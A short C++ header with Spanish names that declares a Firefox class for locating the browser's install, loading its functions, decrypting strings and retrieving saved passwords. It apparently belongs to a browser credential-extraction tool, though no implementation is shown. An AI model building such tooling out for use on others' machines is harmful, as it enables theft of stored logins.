#include <iostream>
#include <Shlwapi.h>
#include <shlobj.h>
#include <windows.h>
#include <string>
#include <fstream>

#include "sqlite3.h"
#include "Recursos.h"

#pragma comment (lib, "shlwapi.lib")

using namespace std;


#pragma once
class Firefox
{
public:
	Firefox();
	~Firefox();

	char* rutaInstalado();
	BOOL cargarFunciones(char* installPath);
	char* descifrar(const char* s);
	char* getContraseñas();
};

